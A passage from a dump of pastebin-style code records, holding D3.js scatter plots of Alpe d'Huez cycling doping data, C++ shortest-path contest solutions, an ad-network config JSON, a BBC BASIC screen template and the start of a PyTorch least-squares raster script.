          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotation
        svg
          .selectAll(""annotation"")
          .data(data.filter((d) => d[""Doping""] !== """"))
          .enter()
          .append(""line"")
          .attr(""x1"", (d) => xScale(d[""Year""]))
          .attr(""y1"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""x2"", (d) => xScale(d[""Year""]) + 20)
          .attr(""y2"", (d) => yScale(parseTime(d[""Time""])) - 20)
          .attr(""stroke-width"", 1)
          .attr(""stroke"", ""red"");

        svg
          .selectAll(""annotation"")
          .data(data.filter((d) => d[""Doping""] !== """"))
          .enter()
          .append(""text"")
          .attr(""x"", (d) => xScale(d[""Year""]) + 25)
          .attr(""y"", (d) => yScale(parseTime(d[""Time""])) - 25)
          .text((d) => d[""Name""])
          .attr(""class"", ""annotation"");
      });
    </script>
  </body>
</html>
"
kQYzhgUP,outliers_scatter,NTahmid,HTML,Tuesday 13th of February 2024 11:07:09 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .outlier {
      stroke: red;
      stroke-width: 2;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      var colors = [""#27ae60"", ""#8e44ad""];
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      d3.json(url).then(function (data) {
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10;

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", (d) => (d[""Place""] > 30 ? ""dot outlier"" : ""dot""))
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");
      });
    </script>
  </body>
</html>
"
DZr08J7n,extrema_scatter,NTahmid,HTML 5,Tuesday 13th of February 2024 11:06:01 AM CDT,"<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation-line {
      stroke: red;
      stroke-width: 1.5;
    }

    .annotation-text {
      fill: red;
      font-size: 12px;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      var colors = [""#27ae60"", ""#8e44ad""];
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      d3.json(url).then(function (data) {
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10;

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // Annotations for extrema
        var minTime = d3.min(data, (d) => d[""Seconds""]);
        var maxTime = d3.max(data, (d) => d[""Seconds""]);
        var minData = data.find((d) => d[""Seconds""] === minTime);
        var maxData = data.find((d) => d[""Seconds""] === maxTime);

        // Annotation for minimum time
        svg.append(""line"")
          .attr(""x1"", xScale(minData[""Year""]))
          .attr(""y1"", yScale(parseTime(minData[""Time""])))
          .attr(""x2"", xScale(minData[""Year""]) - 50)
          .attr(""y2"", yScale(parseTime(minData[""Time""])) - 50)
          .attr(""class"", ""annotation-line"");

        svg.append(""text"")
          .attr(""x"", xScale(minData[""Year""]) - 55)
          .attr(""y"", yScale(parseTime(minData[""Time""])) - 55)
          .text(""Fastest time: "" + minData[""Time""])
          .attr(""class"", ""annotation-text"");

        // Annotation for maximum time
        svg.append(""line"")
          .attr(""x1"", xScale(maxData[""Year""]))
          .attr(""y1"", yScale(parseTime(maxData[""Time""])))
          .attr(""x2"", xScale(maxData[""Year""]) - 80 )
          .attr(""y2"", yScale(parseTime(maxData[""Time""])) + 40)
          .attr(""class"", ""annotation-line"");

        svg.append(""text"")
          .attr(""x"", xScale(maxData[""Year""]) - 100)
          .attr(""y"", yScale(parseTime(maxData[""Time""])) + 55)
          .text(""Slowest time: "" + maxData[""Time""])
          .attr(""class"", ""annotation-text"");
      });
    </script>
  </body>
</html>
"
J2Hw6Kfu,complex_trend_scatter,NTahmid,HTML 5,Tuesday 13th of February 2024 11:04:13 AM CDT,"```<!doctype html>
<meta charset=""utf-8"" />
<html>
  <head>
    <script src=""https://d3js.org/d3.v6.min.js"" charset=""utf-8""></script>
  </head>

  <style>
    * {
      font-family: sans-serif;
    }

    #tooltip {
      visibility: hidden;
      position: absolute;
      opacity: 0.8;
      padding: 10px;
      vertical-align: middle;
      border-radius: 5px;
      background-color: #ecf0f1;
      font-size: 14px;
    }

    .textbox {
      font-size: 14px;
    }

    #legend {
      opacity: 0.2;
      fill: #2c3e50;
    }

    #title {
      text-anchor: middle;
      font-size: 22px;
    }

    .label {
      text-anchor: middle;
    }

    #svg {
      background-color: white;
    }

    .annotation {
      fill: red;
      stroke: red;
    }
  </style>

  <body>
    <div id=""container"" align=""center""></div>

    <script type=""text/javascript"">
      // Url to the input data
      var url =
        ""https://raw.githubusercontent.com/freeCodeCamp/ProjectReferenceData/master/cyclist-data.json"";

      // Colors to differentiate riders with and without doping allegations
      var colors = [""#27ae60"", ""#8e44ad""];

      // The attributes of the riders corresponding to the above colors
      var legendKeys = [""No Doping Allegations"", ""Doping Allegations""];

      // Create an invisible div for the tooltip
      const tooltip = d3
        .select(""body"")
        .append(""div"")
        .attr(""id"", ""tooltip"")
        .style(""visibility"", ""hidden"");

      // 1. Load the data from external source
      d3.json(url).then(function (data) {
        // 2. Append svg-object for the bar chart to a div in your webpage
        // (here we use a div with id=container)
        var width = 700;
        var height = 500;
        var margin = { left: 90, top: 80, bottom: 50, right: 20 };
        var axisOffset = 10; // How for the axes are moved away from each other

        const svg = d3
          .select(""#container"")
          .append(""svg"")
          .attr(""id"", ""svg"")
          .attr(""width"", width)
          .attr(""height"", height);

        // 3. Define scales to translate domains of the data to the range of the svg
        var xMin = d3.min(data, (d) => d[""Year""]);
        var xMax = d3.max(data, (d) => d[""Year""]);

        var parseTime = d3.timeParse(""%M:%S"");
        var yMin = d3.min(data, (d) => parseTime(d[""Time""]));
        var yMax = d3.max(data, (d) => parseTime(d[""Time""]));

        var xScale = d3
          .scaleLinear()
          .domain([xMin, xMax])
          .range([margin.left + axisOffset, width - margin.right]);

        var yScale = d3
          .scaleTime()
          .domain([yMax, yMin])
          .range([height - margin.bottom - axisOffset, margin.top]);

        // 4. Draw and transform/translate horizontal and vertical axes
        var xAxis = d3.axisBottom().scale(xScale).tickFormat(d3.format(""d""));
        var yAxis = d3
          .axisLeft()
          .scale(yScale)
          .tickFormat(d3.timeFormat(""%M:%S""));

        svg
          .append(""g"")
          .attr(""transform"", ""translate(0, "" + (height - margin.bottom) + "")"")
          .attr(""id"", ""x-axis"")
          .call(xAxis);

        svg
          .append(""g"")
          .attr(""transform"", ""translate("" + margin.left + "", 0)"")
          .attr(""id"", ""y-axis"")
          .call(yAxis);

        // 5. Draw individual scatter points and define mouse events for the tooltip
        svg
          .selectAll(""scatterPoints"")
          .data(data)
          .enter()
          .append(""circle"")
          .attr(""cx"", (d) => xScale(d[""Year""]))
          .attr(""cy"", (d) => yScale(parseTime(d[""Time""])))
          .attr(""r"", 5)
          .attr(""fill"", (d) => (d[""Doping""] == """" ? colors[0] : colors[1]))
          .attr(""class"", ""dot"")
          .attr(""data-xvalue"", (d) => d[""Year""])
          .attr(""data-yvalue"", (d) => parseTime(d[""Time""]))
          .on(""mouseover"", function (d) {
            info = d[""originalTarget""][""__data__""];
            tooltip
              .style(""visibility"", ""visible"")
              .style(""left"", event.pageX + 10 + ""px"")
              .style(""top"", event.pageY - 80 + ""px"")
              .attr(""data-year"", info[""Year""])
              .html(
                info[""Name""] +
                  "" ("" +
                  info[""Year""] +
                  "") <br> Time: "" +
                  info[""Time""] +
                  ""<br><br>"" +
                  info[""Doping""]
              );
          })
          .on(""mousemove"", function () {
            tooltip.style(""left"", event.pageX + 10 + ""px"");
          })
          .on(""mouseout"", function () {
            tooltip.style(""visibility"", ""hidden"");
          });

        // 6. Finalize chart by adding title, axes labels and legend
        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", height - margin.bottom / 5)
          .attr(""class"", ""label"")
          .text(""Year"");

        svg
          .append(""text"")
          .attr(""y"", margin.left / 4)
          .attr(""x"", -height / 2)
          .attr(""transform"", ""rotate(-90)"")
          .attr(""class"", ""label"")
          .text(""Time to finish"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 2.6)
          .attr(""id"", ""title"")
          .text(""Doping in professional bike racing"");

        svg
          .append(""text"")
          .attr(""x"", margin.left + (width - margin.left - margin.right) / 2)
          .attr(""y"", margin.top / 1.4)
          .text(""35 fastest times to finish Alpe d'Huez"")
          .style(""font-size"", ""16px"")
          .style(""text-anchor"", ""middle"");

        svg
          .selectAll(""legendSymbols"")
          .data(legendKeys)
          .enter()
          .append(""circle"")
          .attr(""cx"", width - margin.right - 200)
          .attr(""cy"", (d, i) => 150 + i * 25)
          .attr(""r"", 5)
          .attr(""fill"", (d, i) => colors[i]);

        svg
          .selectAll(""legendTexts"")
          .data(legendKeys)
          .enter()
          .append(""text"")
          .text((d) => d)
          .attr(""x"", width - margin.right - 200 + 15)
          .attr(""y"", (d, i) => 150 + i * 25 + 5)
          .attr(""class"", ""textbox"");

        const legend = svg
          .append(""rect"")
          .attr(""x"", width - margin.right - 200 - 15)
          .attr(""y"", 150 - 5 - 10)
          .attr(""rx"", 5)
          .attr(""ry"", 5)
          .attr(""width"", 195)
          .attr(""height"", 55)
          .attr(""id"", ""legend"");

        // 7. Add annotations to highlight complex trends
        svg
          .append(""line"")
          .attr(""x1"", xScale(xMin))
          .attr(""y1"", yScale(yMax))
          .attr(""x2"", xScale(xMax))
          .attr(""y2"", yScale(yMin))
          .attr(""stroke-width"", 2)
          .attr(""stroke"", ""red"")
          .attr(""class"", ""annotation"");

        svg
          .append(""text"")
          .attr(""x"", xScale(xMax) - 400)
          .attr(""y"", yScale(yMin) + 30)
          .text(""Trend: Performance improvement over years"")
          .attr(""class"", ""annotation"");

        svg
          .append(""circle"")
          .attr(""cx"", xScale(2004))
          .attr(""cy"", yScale(parseTime(""37:36"")))
          .attr(""r"", 10)
          .attr(""stroke"", ""red"")
          .attr(""fill"", ""none"")
          .attr(""class"", ""annotation"");

        svg
          .append(""text"")
          .attr(""x"", xScale(2004) + 15)
          .attr(""y"", yScale(parseTime(""37:36"")) + 15)
          .text(""Fastest time with doping allegations"")
          .attr(""class"", ""annotation"");
      });
    </script>
  </body>
</html>
```
"
JU5TreEd,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 10:58:13 AM CDT,"#include <bits/stdc++.h>
 
using namespace std;
const int maxn = 1e5 + 10;
const int INF = (1 << 30);
typedef long long ll;
const ll inf = (1LL << 59LL);
struct node{
    int till, euro, time;
    node (){}
    node(int _t, int _timee, int _e){
        till = _t;
        time = _timee;
        euro = _e;
    }
};
vector<node> graph[5005];
int n, m, S;
bool visited[3005][6005];
int idx[3005];
int main()
{
    ios_base::sync_with_stdio(false);
    cin >> S >> n >> m;
    for(int i = 0; i < m; i++){
        int a, b, c, d;
        cin >> a >> b >> c >> d;
        a--; b--;
        graph[a].push_back(node(b, c, d));
        graph[b].push_back(node(a, c, d));
    }
    memset(visited, false, sizeof visited);
   int  min_vreme = INF;
    queue<int> q;
    q.push(0);
    q.push(0);
    q.push(0);
    int sosed;
    int weight, money;
    int eee;
    while(!q.empty()){
        int teme = q.front();
        q.pop();
        int pari = q.front();
        q.pop();
        int pat = q.front();
        q.pop();
        if(teme == n - 1){
            if(pat <= S){
                min_vreme = min(min_vreme, pari);
            }
            continue;
        }
        for(int i = 0; i < (int)graph[teme].size(); i++){
            sosed = graph[teme][i].till;
            money = graph[teme][i].time;
            weight = graph[teme][i].euro;
            if(weight + pat <= S){
                    eee = money + pari;
            if(eee >= 6000) eee -= 6000;
                if(!visited[sosed][eee]){
                    visited[sosed][eee] = true;
                    q.push(sosed);
                    q.push(pari + money);
                    q.push(pat + weight);
                }
            }
        }
 
    }
 
    q.push(0);
    q.push(0);
    q.push(0);
    memset(visited, false, sizeof visited);
    while(!q.empty()){
        int teme = q.front();
        q.pop();
        int pari = q.front();
        q.pop();
        int pat = q.front();
        q.pop();
        if(teme == n - 1){
            if(pat <= S){
                min_vreme = min(min_vreme, pari);
            }
            continue;
        }
        for(int i = 0; i < (int)graph[teme].size(); i++){
            sosed = graph[teme][i].till;
            money = graph[teme][i].time;
            weight = graph[teme][i].euro;
            if(weight + pat <= S){
                    eee = pat + weight;
                if(eee >= 6000){
                    eee -= 6000;
                }
                if(!visited[sosed][pat + weight]){
                    visited[sosed][pat + weight] = true;
                    q.push(sosed);
                    q.push(pari + money);
                    q.push(pat + weight);
                }
            }
        }
 
    }
        q.push(0);
    q.push(0);
    q.push(0);
    memset(idx, 0, sizeof idx);
    memset(visited, false, sizeof visited);
    while(!q.empty()){
        int teme = q.front();
        q.pop();
        int pari = q.front();
        q.pop();
        int pat = q.front();
        q.pop();
        if(teme == n - 1){
            if(pat <= S){
                min_vreme = min(min_vreme, pari);
            }
            continue;
        }
        for(int i = 0; i < (int)graph[teme].size(); i++){
            sosed = graph[teme][i].till;
            money = graph[teme][i].time;
            weight = graph[teme][i].euro;
            if(weight + pat <= S){
                    eee = idx[sosed] + 1;
                    if(eee >= 6000){
                        eee -= 6000;
                    }
                    idx[sosed]++;
                if(!visited[sosed][pat + weight]){
                    visited[sosed][pat + weight] = true;
                    q.push(sosed);
                    q.push(pari + money);
                    q.push(pat + weight);
                }
            }
        }
 
    }
 
 
 
    if(min_vreme == INF){
        cout << -1 << endl;
        return 0;
    }
    cout << min_vreme << endl;
    return 0;
}"
HsEUYSwP,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 10:56:18 AM CDT,"#include <iostream>
#include <queue>
#include <fstream>
#include <vector>
#include <cstring>
//#include <bits/stdc++.h>
using namespace std;
const int maxn = 3005;
const int INF = 1e8;
const int di[] = {-1, 1, 0, 0};
const int dj[] = {0, 0, -1, 1};
struct node {
    int b, T, E;
    node () {}
    node(int _b, int _T, int _E) {
        b = _b;
        T = _T;
        E = _E;
    }
    
};
vector<node> graph[maxn];
int n, m;
int dp[maxn][2002];
int rec(int at, int money_left) {
    if(at == n) {
        return 0;
    }
    if(money_left == 0) {
        return INF;
    }
    if(dp[at][money_left] != -1) {
        return dp[at][money_left];
    }
    int res = INF;
    for(int i = 0; i < (int) graph[at].size(); i++) {
        int neighbour = graph[at][i].b;
        int time = graph[at][i].T;
        int money = graph[at][i].E;
        
        if(money_left >= money) {
            res = min(res, rec(neighbour, money_left - money) + time);
        }
    }
    return dp[at][money_left] = res;
}
int main() {
    ios_base::sync_with_stdio(false);
//    ifstream cin(""in.txt"");
    int S;
    cin >> S >> n >> m;
    
    for(int i = 0; i < m; i++) {
        int a, b, c, d;
        cin >> a >> b >> c >> d;
        graph[a].push_back(node(b, c, d));
        graph[b].push_back(node(a, c, d));
    }
    memset(dp, -1, sizeof dp);
    int res = INF;
    for(int i = 1; i <= S; i++) {
        res = min(res, rec(1, i));
    }
    if(res >= INF) {
        res = -1;
    }
    cout << res << endl;
    
    return 0;
}
"
ubrqY1Eq,grid,tifaout,JSON,Tuesday 13th of February 2024 10:51:08 AM CDT,"{
	""ADS"": {
	
		""native_type"": ""applovin"",
		""inter_type"": ""applovin"",
		""banner_type"": ""applovin"",
        ""reward_type"": ""applovin"",
	

	 
		""banner_applovin"": ""60f8d7ed0ba6548d"",
		""native_applovin"": ""6397781f6e4ecaf9"",
		""interstitial_applovin"": ""1db592af0ce9f8bd"",
        ""reward_applovin"": ""de53b7059fc8b4e9"",
        ""open_applovin"": ""c26c8f8ff266b73d"",


		 
		
		""facebook_interstitial"": ""173468672252119_174051032193883"",
		""facebook_native"": ""173468672252119_174051175527202"",
		""facebook_banner"": ""173468672252119_173477828917870"",
		""facebook_reward"": ""2028286464230349_2033281763730819"",
		
		""pushUpdate"": ""off"",
        ""newPackage"": """"

		 
	}  
   }"
Wt3cSBCW,BBCBASIC_TEMPLATE,lovejoy777,ZXBasic,Tuesday 13th of February 2024 10:49:07 AM CDT,"   10 REM ******************************
   20 REM *        AGON LIGHT 2        *
   30 REM *     BBC BASIC TEMPLATE     *
   40 REM *      BBC BASIC MODE 8      *
   50 REM *    C/W RESET ORIG SCREEN   *
   60 REM *      BY STEVE LOVEJOY      *
   70 REM ******************************
   80 :
   90 REM MAIN SETUP.
  100 CLEAR : REM clear memory.
  110 :
  120 PROC_LOAD_VARS            : REM CALL LOAD_VARS.
  130 PROC_GET_ORIGINALS        : REM CALL GET_ORIGINALS.
  130 PROC_INITIALIZE_SCREEN    : REM CALL INIT_SCREEN.
  140 PROC_MAIN_LOOP            : REM CALL MAIN_LOOP.
  150 :
 1000 DEF PROC_MAIN_LOOP        : REM ** MAIN LOOP **
 1010 COLOUR COL_YELLOW%        : REM change text colour.
 1020 PRINT TAB(15,10)""HELLO WORLD!"" : REM print at (x,y).
 1030 A%=INKEY(0)               : REM GET keyboard input.
 1040 IF A%=120 OR A%=88 THEN PROC_CHECK_EXIT : REM press X to exit.
 1050 GOTO 1000                 : REM loop back to start of MAIN_LOOP.
 3000 ENDPROC : REM END PROC_MAINLOOP.
 3010 :
 4000 DEF PROC_GET_ORIGINALS    : REM ** GET_ORIGINALS **
 4010 OM% = FN_GETBYTE_VDP(&27) : REM GET original Screen Mode.
 4020 VDU 23,230,255,255,255,255,255,255,255,255 : REM create new filled char with original colours.
 4030 PRINT TAB(0,0);CHR$(230)  : REM print new char top left.
 4040 OTFC% = POINT(1,1)        : REM get original text fg colour.
 4050 VDU 127                   : REM backspace/delete to get to clear.
 4060 OTBC% = POINT(1,1) + 128  : REM get original text bg colour.
 4070 ENDPROC : REM END PROC_GET_ORIGINALS
 4080 :
 5500 DEF PROC_INITIALIZE_SCREEN : REM ** INITIALIZE_SCREEN **
 5510 MODE 8                     : REM SETS new screen mode.
 5520 CLS                        : REM clear text screen.
 5530 CLG                        : REM clear graphics screen.
 5540 PROC_HIDE_CURSOR
 5550 ENDPROC : REM END PROC_INITIALIZE_SCREEN.
 5570 :
 6000 DEF PROC_HIDE_CURSOR       : REM ** HIDE_CURSOR **
 6010 VDU 23,1,0;0;0;0;
 6020 ENDPROC
 6030 :
 6040 DEF PROC_SHOW_CURSOR       : REM ** SHOW_CURSOR **
 6050 VDU 23,1,1;0;0;0;
 6060 ENDPROC
 6070 :
 8000 DEF PROC_LOAD_VARS : REM ** LOAD_VARS **
 8010 REM NAME COLOURS +128 for background.
 8020 COL_BLACK% = 0
 8030 COL_RED% = 1
 8040 COL_GREEN% = 2
 8050 COL_YELLOW% = 3
 8060 COL_BLUE% = 4
 8070 COL_MAGENTA% = 5
 8080 COL_CYAN% = 6
 8090 COL_WHITE% = 7
 8100 COL_INTRED% = 9
 8110 COL_INTGREEN% = 10
 8120 COL_INTYELLOW% = 11
 8130 COL_INTBLUE% = 12
 8140 COL_INTMAGENTA% = 13
 8150 COL_INTCYAN% = 14
 8160 COL_INTWHITE% = 15
 8500 ENDPROC : REM END LOAD_VARS.
 8510 :
 8600 DEF PROC_CHECK_EXIT : REM ** CHECK EXIT **
 8610 PRINT TAB(7,12);""Quit Press Y to confirm""
 8620 N$=GET$
 8630 IF N$=""y"" OR N$= ""Y"" THEN GOTO 8670
 8640 ENDPROC : REM END PROC_CHECK_EXIT
 8660 :
 8670 PROC_RESET_ORIGINALS : REM CALL reset original.
 8680 P.""GOODBYE!""         : REM print to screen to test restore function.
 8690 END : REM END program.
 8690 :
 9000 DEF PROC_RESET_ORIGINALS : REM ** RESET_ORIGINALS **
 9010 VDU 20           : REM reset logical colours to default colours. 
 9010 MODE OM%         : REM SET original screen mode.
 9020 COLOUR OTFC%     : REM SET original text fg colour.
 9030 COLOUR OTBC%     : REM SET original text bg colour.
 9060 PROC_SHOW_CURSOR : REM rest cursor.
 9070 CLS              : REM clear screen to SET original colours.
 9100 ENDPROC : REM END RESET_ORIGINALS
 9110 :"
2nNNQWmE,Least_Square.py,Abhisek92,Python,Tuesday 13th of February 2024 10:48:04 AM CDT,"import torch
import rasterio as rio
from pathlib import Path
from einops import rearrange
from rich.progress import track

src_dir = Path("""")
dst_img = Path("""")

dtype = torch.float32
device=""cpu""
nodata = torch.nan

img_list = sorted(src_dir.glob(""*.tif""))

db = torch.cat(
    tensors=[
        torch.tensor(
            data=rio.open(img, 'r').read(),
            dtype=dtype,
            device=device
        )
        for img in track(
            sequence=img_list,
            description='♻️'
        )
    ],
    dim=0
)

t, h, w = db.shape
n = h * w

db = rearrange(
    tensor=db,
    pattern=""t h w -> (h w) t 1""
)

dt = repeat(
    tensor=torch.arange(
        start=0,
        end=t,
        step=1,
        dtype=dtype,
        device=device,
        requires_grad=False
    ),
    pattern=""t -> n t 1"",
    n=n
)

dt = torch.cat(
    tensors=[
        dt,
        torch.ones_like(dt)
    ],
